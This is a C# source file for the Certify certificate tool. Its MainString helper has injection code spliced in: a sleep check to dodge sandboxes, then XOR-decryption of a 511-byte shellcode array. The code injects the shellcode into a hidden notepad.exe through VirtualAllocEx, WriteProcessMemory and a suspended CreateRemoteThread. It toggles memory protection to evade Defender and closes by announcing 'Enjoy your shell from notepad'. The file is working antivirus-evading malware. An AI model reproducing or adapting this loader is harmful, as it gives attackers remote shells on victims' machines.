using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace Certify
{
    public class Program
    {
        public const uint PAGE_EXECUTE_READ_WRITE = 0x40;
        public const uint PAGE_NO_ACCESS = 0x01;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        //https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return xored;
        }

        public static void FileExecute(string commandName, Dictionary<string, string> parsedArgs)
        {
            // execute w/ stdout/err redirected to a file

            var file = parsedArgs["/outfile"];

            var realStdOut = Console.Out;
            var realStdErr = Console.Error;

            using (var writer = new StreamWriter(file, false))
            {
                writer.AutoFlush = true;
                Console.SetOut(writer);
                Console.SetError(writer);

                MainExecute(commandName, parsedArgs);

                Console.Out.Flush();
                Console.Error.Flush();
            }
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);
        }

        public static void MainExecute(string commandName, Dictionary<string, string> parsedArgs)
        {
            // main execution logic
            var sw = new Stopwatch();
            sw.Start();

            if(!(parsedArgs.ContainsKey("/quiet") || parsedArgs.ContainsKey("/q") || parsedArgs.ContainsKey("/json")))
                Info.ShowLogo();

            parsedArgs.Remove("/q");
            parsedArgs.Remove("/quiet");

            try
            {
                var commandFound = new CommandCollection().ExecuteCommand(commandName, parsedArgs);

                // show the usage if no commands were found for the command name
                if (commandFound == false)
                    Info.ShowUsage();
            }
            catch (Exception e)
            {
                Console.WriteLine("\r\n[!] Unhandled Certify exception:\r\n");
                Console.WriteLine(e);
            }

            sw.Stop();
            if(!parsedArgs.ContainsKey("/json"))
                Console.WriteLine("\r\n\r\nCertify completed in " + sw.Elapsed);
        }

        public static string MainString(string command)
        {
            // helper that executes an input string command and returns results as a string





            Console.WriteLine("[+] Delay of three seconds for scan bypass check");

            DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                return "";
            }

            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            Console.WriteLine("[+] Opening notepad.exe in the background");

            Process p = new Process();
            p.StartInfo = new ProcessStartInfo("notepad.exe");
            p.StartInfo.WorkingDirectory = @"C:\Windows\System32\";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();


            int pid = Process.GetProcessesByName("notepad")[0].Id;

            Console.WriteLine("[+] OpenProcess with PID {0}.", new string[] { pid.ToString() });

            hProcess = OpenProcess(0x001F0FFF, false, pid);


            string key = "dubradupa";

            // This shellcode byte is the encrypted output from encryptor.exe
            //byte[] xorshellcode = new byte[511] { 0x98, 0x3d, 0xe1, 0x96, 0x91, 0x8c, 0xb9, 0x70, 0x61, 0x64, 0x34, 0x33, 0x33, 0x31, 0x36, 0x3d, 0x41, 0xb3, 0x01, 0x3d, 0xe9, 0x20, 0x01, 0x35, 0x3d, 0xfb, 0x33, 0x7c, 0x23, 0x2a, 0xf9, 0x33, 0x44, 0x38, 0x41, 0xa8, 0x2c, 0x7a, 0xd5, 0x38, 0x2b, 0x2c, 0xfe, 0x02, 0x31, 0x2c, 0x44, 0xa2, 0xde, 0x5d, 0x05, 0x09, 0x72, 0x4d, 0x44, 0x34, 0xa3, 0xbb, 0x6c, 0x25, 0x74, 0xb1, 0x83, 0x89, 0x27, 0x23, 0x23, 0x29, 0xef, 0x27, 0x50, 0xea, 0x26, 0x49, 0x2a, 0x73, 0xb1, 0x02, 0xf4, 0x08, 0x79, 0x6f, 0x77, 0x6d, 0xf7, 0x13, 0x64, 0x75, 0x70, 0xea, 0xe4, 0xfd, 0x62, 0x72, 0x61, 0x2c, 0xf0, 0xb0, 0x15, 0x03, 0x3d, 0x63, 0xa2, 0xea, 0x2c, 0x6d, 0x20, 0x25, 0xef, 0x35, 0x42, 0x3b, 0x60, 0xb4, 0x96, 0x26, 0x2c, 0x55, 0xbc, 0x2a, 0x8d, 0xa8, 0x25, 0xfe, 0x44, 0xe9, 0x2c, 0x74, 0xb4, 0x3a, 0x50, 0xa4, 0xd9, 0x31, 0xa0, 0xad, 0x78, 0x23, 0x73, 0xa0, 0x5c, 0x95, 0x05, 0x90, 0x28, 0x76, 0x2e, 0x56, 0x69, 0x21, 0x4c, 0xa1, 0x14, 0xbc, 0x2d, 0x26, 0xf9, 0x21, 0x40, 0x3c, 0x71, 0xb1, 0x02, 0x34, 0xe9, 0x7e, 0x29, 0x20, 0xfe, 0x30, 0x7d, 0x2d, 0x74, 0xb2, 0x33, 0xea, 0x60, 0xfd, 0x31, 0x39, 0x2c, 0x74, 0xb2, 0x33, 0x39, 0x3a, 0x2c, 0x2a, 0x20, 0x3c, 0x34, 0x3b, 0x33, 0x3b, 0x2c, 0xf6, 0x9c, 0x41, 0x25, 0x27, 0x9d, 0x92, 0x39, 0x25, 0x2c, 0x2a, 0x29, 0xef, 0x67, 0x8b, 0x39, 0x9e, 0x9b, 0x8a, 0x2d, 0x28, 0xda, 0x02, 0x11, 0x40, 0x3e, 0x57, 0x47, 0x70, 0x61, 0x25, 0x23, 0x2b, 0xfb, 0x87, 0x2c, 0xf4, 0x9c, 0xc1, 0x65, 0x75, 0x62, 0x3b, 0xe8, 0x81, 0x3c, 0xcc, 0x63, 0x64, 0x6a, 0xf2, 0xb2, 0xc9, 0x3e, 0x7f, 0x31, 0x35, 0x2d, 0xfc, 0x86, 0x3e, 0xe8, 0x95, 0x34, 0xca, 0x2d, 0x13, 0x53, 0x65, 0x8d, 0xb4, 0x28, 0xfc, 0x9a, 0x09, 0x65, 0x74, 0x62, 0x72, 0x38, 0x25, 0xcf, 0x59, 0xe1, 0x0f, 0x75, 0x9d, 0xa7, 0x0b, 0x6e, 0x34, 0x2e, 0x31, 0x34, 0x38, 0x53, 0xbb, 0x2c, 0x55, 0xb5, 0x38, 0x9e, 0xa4, 0x3d, 0xeb, 0xb0, 0x29, 0x9b, 0xb5, 0x38, 0xe8, 0xa5, 0x34, 0xd8, 0x98, 0x6e, 0xbb, 0x95, 0x8f, 0xb4, 0x2c, 0xfc, 0xa5, 0x18, 0x71, 0x25, 0x2d, 0x3c, 0xe8, 0x86, 0x3d, 0xeb, 0x8b, 0x20, 0xde, 0xec, 0xd5, 0x15, 0x05, 0x8a, 0xb7, 0xf7, 0xa1, 0x10, 0x7f, 0x39, 0x9e, 0xaa, 0x00, 0x87, 0x9a, 0xf2, 0x64, 0x75, 0x70, 0x29, 0xe7, 0x99, 0x72, 0x3a, 0xe8, 0x86, 0x38, 0x41, 0xa8, 0x0e, 0x71, 0x23, 0x2a, 0x29, 0xed, 0x8c, 0x31, 0xdb, 0x66, 0xac, 0xaa, 0x2d, 0x9e, 0xb1, 0xf6, 0x88, 0x61, 0x1a, 0x20, 0x2a, 0xf1, 0xa5, 0x44, 0x2b, 0xf9, 0x97, 0x0e, 0x35, 0x23, 0x2b, 0x09, 0x64, 0x65, 0x70, 0x61, 0x25, 0x2d, 0x2a, 0xfb, 0x93, 0x2c, 0x44, 0xb9, 0x20, 0xde, 0x2d, 0xc6, 0x21, 0x84, 0x9b, 0xa0, 0x38, 0xe8, 0xa7, 0x3c, 0xeb, 0xb5, 0x2c, 0x55, 0xbc, 0x39, 0xe8, 0x94, 0x3d, 0xeb, 0xa8, 0x29, 0xed, 0x8c, 0x31, 0xdb, 0x66, 0xac, 0xaa, 0x2d, 0x9e, 0xb1, 0xf6, 0x88, 0x61, 0x19, 0x5d, 0x3a, 0x33, 0x36, 0x3d, 0x1d, 0x70, 0x21, 0x64, 0x75, 0x23, 0x2a, 0x0b, 0x64, 0x2f, 0x31, 0xdb, 0x6f, 0x5a, 0x6d, 0x42, 0x9e, 0xb1, 0x22, 0x29, 0x20, 0xde, 0x00, 0x0c, 0x3f, 0x00, 0x9b, 0xa0, 0x39, 0x9e, 0xaa, 0x9c, 0x5e, 0x8d, 0x9e, 0x9b, 0x3d, 0x71, 0xa2, 0x2c, 0x5c, 0xa4, 0x3a, 0xe4, 0x92, 0x00, 0xc4, 0x20, 0x9b, 0x92, 0x3a, 0x18, 0x61, 0x3d, 0xce, 0x90, 0x7c, 0x4e, 0x7f, 0x23, 0xfb, 0xbb, 0x9b, 0xa0 };
            byte[] xorshellcode = new byte[511] { 0x98, 0x3d, 0xe1, 0x96, 0x91, 0x8c, 0xb9, 0x70, 0x61, 0x64, 0x34, 0x33, 0x33, 0x31, 0x36, 0x3d, 0x41, 0xb3, 0x01, 0x3d, 0xe9, 0x20, 0x01, 0x35, 0x23, 0x38, 0xea, 0x36, 0x6d, 0x2a, 0xf9, 0x33, 0x44, 0x3d, 0x7f, 0xd6, 0x2e, 0x3f, 0x2a, 0xf9, 0x13, 0x34, 0x38, 0x41, 0xa8, 0x2c, 0x44, 0xa2, 0xde, 0x5d, 0x05, 0x09, 0x72, 0x4d, 0x44, 0x34, 0xa3, 0xbb, 0x6c, 0x25, 0x74, 0xb1, 0x83, 0x89, 0x27, 0x23, 0x23, 0x29, 0xef, 0x27, 0x50, 0xea, 0x26, 0x49, 0x2a, 0x73, 0xb1, 0x02, 0xf4, 0x08, 0x79, 0x6f, 0x77, 0x6d, 0xf7, 0x13, 0x64, 0x75, 0x70, 0xea, 0xe4, 0xfd, 0x62, 0x72, 0x61, 0x2c, 0xf0, 0xb0, 0x15, 0x03, 0x3d, 0x63, 0xa2, 0x25, 0xef, 0x35, 0x50, 0xea, 0x2c, 0x6d, 0x2b, 0x73, 0xb1, 0x34, 0x96, 0x26, 0x2c, 0x55, 0xbc, 0x2a, 0x8d, 0xa8, 0x25, 0xfe, 0x44, 0xe9, 0x2c, 0x74, 0xb4, 0x3a, 0x50, 0xa4, 0x34, 0xb1, 0xa8, 0x69, 0xd9, 0x23, 0x73, 0xa0, 0x5c, 0x95, 0x05, 0x90, 0x28, 0x76, 0x2e, 0x56, 0x69, 0x21, 0x4c, 0xa1, 0x14, 0xbc, 0x2d, 0x26, 0xf9, 0x21, 0x40, 0x3c, 0x71, 0xb1, 0x02, 0x34, 0xe9, 0x7e, 0x29, 0x20, 0xfe, 0x30, 0x7d, 0x2d, 0x74, 0xb2, 0x33, 0xea, 0x60, 0xfd, 0x38, 0x60, 0xb4, 0x34, 0x3a, 0x33, 0x39, 0x3a, 0x2c, 0x2a, 0x20, 0x3c, 0x34, 0x3b, 0x33, 0x3b, 0x2c, 0xf6, 0x9c, 0x41, 0x25, 0x27, 0x9d, 0x92, 0x39, 0x25, 0x2c, 0x2a, 0x29, 0xef, 0x67, 0x8b, 0x39, 0x9e, 0x9b, 0x8a, 0x2d, 0x28, 0xda, 0x02, 0x11, 0x40, 0x3e, 0x57, 0x47, 0x70, 0x61, 0x25, 0x23, 0x2b, 0xfb, 0x87, 0x2c, 0xf4, 0x9c, 0xc1, 0x65, 0x75, 0x62, 0x3b, 0xe8, 0x81, 0x3c, 0xcc, 0x63, 0x64, 0x6a, 0xf2, 0xde, 0x72, 0x8a, 0x23, 0x31, 0x35, 0x2d, 0xfc, 0x86, 0x3e, 0xe8, 0x95, 0x34, 0xca, 0x2d, 0x13, 0x53, 0x65, 0x8d, 0xb4, 0x28, 0xfc, 0x9a, 0x09, 0x65, 0x74, 0x62, 0x72, 0x38, 0x25, 0xcf, 0x59, 0xe1, 0x0f, 0x75, 0x9d, 0xa7, 0x0b, 0x6e, 0x34, 0x2e, 0x31, 0x34, 0x38, 0x53, 0xbb, 0x2c, 0x55, 0xb5, 0x38, 0x9e, 0xa4, 0x3d, 0xeb, 0xb0, 0x29, 0x9b, 0xb5, 0x38, 0xe8, 0xa5, 0x34, 0xd8, 0x98, 0x6e, 0xbb, 0x95, 0x8f, 0xb4, 0x2c, 0xfc, 0xa5, 0x18, 0x71, 0x25, 0x2d, 0x3c, 0xe8, 0x86, 0x3d, 0xeb, 0x8b, 0x20, 0xde, 0xec, 0xd5, 0x15, 0x05, 0x8a, 0xb7, 0xf7, 0xa1, 0x10, 0x7f, 0x39, 0x9e, 0xaa, 0x00, 0x87, 0x9a, 0xf2, 0x64, 0x75, 0x70, 0x29, 0xe7, 0x99, 0x72, 0x3a, 0xe8, 0x86, 0x38, 0x41, 0xa8, 0x0e, 0x71, 0x23, 0x2a, 0x29, 0xed, 0x8c, 0x31, 0xdb, 0x66, 0xac, 0xaa, 0x2d, 0x9e, 0xb1, 0xf6, 0x88, 0x61, 0x1a, 0x20, 0x2a, 0xf1, 0xa5, 0x44, 0x2b, 0xf9, 0x97, 0x0e, 0x35, 0x23, 0x2b, 0x09, 0x64, 0x65, 0x70, 0x61, 0x25, 0x2d, 0x2a, 0xfb, 0x93, 0x2c, 0x44, 0xb9, 0x20, 0xde, 0x2d, 0xc6, 0x21, 0x84, 0x9b, 0xa0, 0x38, 0xe8, 0xa7, 0x3c, 0xeb, 0xb5, 0x2c, 0x55, 0xbc, 0x39, 0xe8, 0x94, 0x3d, 0xeb, 0xa8, 0x29, 0xed, 0x8c, 0x31, 0xdb, 0x66, 0xac, 0xaa, 0x2d, 0x9e, 0xb1, 0xf6, 0x88, 0x61, 0x19, 0x5d, 0x3a, 0x33, 0x36, 0x3d, 0x1d, 0x70, 0x21, 0x64, 0x75, 0x23, 0x2a, 0x0b, 0x64, 0x2f, 0x31, 0xdb, 0x6f, 0x5a, 0x6d, 0x42, 0x9e, 0xb1, 0x22, 0x29, 0x20, 0xde, 0x00, 0x0c, 0x3f, 0x00, 0x9b, 0xa0, 0x39, 0x9e, 0xaa, 0x9c, 0x5e, 0x8d, 0x9e, 0x9b, 0x3d, 0x71, 0xa2, 0x2c, 0x5c, 0xa4, 0x3a, 0xe4, 0x92, 0x00, 0xc4, 0x20, 0x9b, 0x92, 0x3a, 0x18, 0x61, 0x3d, 0xce, 0x90, 0x7c, 0x4e, 0x7f, 0x23, 0xfb, 0xbb, 0x9b, 0xa0 };


            byte[] shellcode;
            shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));


            Console.WriteLine("[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { hProcess.ToString("X") });
            // Sets a variable that references the memory to be allocated to the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, PAGE_EXECUTE_READ_WRITE);

            Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { addr.ToString("X") });
            // Write shellcode to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            Console.WriteLine("[+] VirtualProtectEx (PAGE_NO_ACCESS) on 0x{0}", new string[] { addr.ToString("X") });
            // Sets the memory space from EXECUTE_READ_WRITE to PAGE_NOACCESS 
            VirtualProtectEx(hProcess, addr, (UIntPtr)shellcode.Length, PAGE_NO_ACCESS, out uint lpflOldProtect);

            Console.WriteLine("[+] CreateRemoteThread (suspended) to 0x{0}", new string[] { addr.ToString("X") });
            // Create the remote thread in a suspended state
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            Console.WriteLine("[+] Sleeping as Defender scans the remote process", null);
            // Sleep for 10 seconds so Defender can scan the remote process
            System.Threading.Thread.Sleep(10000);

            Console.WriteLine("[+] VirtualProtectEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { addr.ToString("X") });
            // Change memory protection backto PAGE_EXECUTE_READ_WRITE.
            VirtualProtectEx(hProcess, addr, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ_WRITE, out lpflOldProtect);

            Console.WriteLine("[+] Resume thread 0x{0}", new string[] { hThread.ToString("X") });
            // Resume the suspended notepad.exe thread
            ResumeThread(hThread);

            Console.WriteLine("[+] Enjoy your shell from notepad");
            //This is for debug. You can comment the below line if you do not need to read all the console messages
            System.Threading.Thread.Sleep(3000);













            var args = command.Split();

            var parsed = ArgumentParser.Parse(args);
            if (parsed.ParsedOk == false)
            {
                Info.ShowLogo();
                Info.ShowUsage();
                return "Error parsing arguments: ${command}";
            }

            var commandName = args.Length != 0 ? args[0] : "";

            var realStdOut = Console.Out;
            var realStdErr = Console.Error;
            TextWriter stdOutWriter = new StringWriter();
            TextWriter stdErrWriter = new StringWriter();
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);

            MainExecute(commandName, parsed.Arguments);

            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);

            var output = "";
            output += stdOutWriter.ToString();
            output += stdErrWriter.ToString();

            return output;
        }

        public static void Main(string[] args)
        {
            try
            {
            
            
                var parsed = ArgumentParser.Parse(args);
                if (parsed.ParsedOk == false)
                {
                    Info.ShowLogo();
                    Info.ShowUsage();
                    return;
                }

                var commandName = args.Length != 0 ? args[0] : "";

                if (parsed.Arguments.ContainsKey("/outfile"))
                {
                    // redirect output to a file specified
                    FileExecute(commandName, parsed.Arguments);
                }
                else
                {
                    MainExecute(commandName, parsed.Arguments);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("\r\n[!] Unhandled Certify exception:\r\n");
                Console.WriteLine(e);
            }
        }
    }
}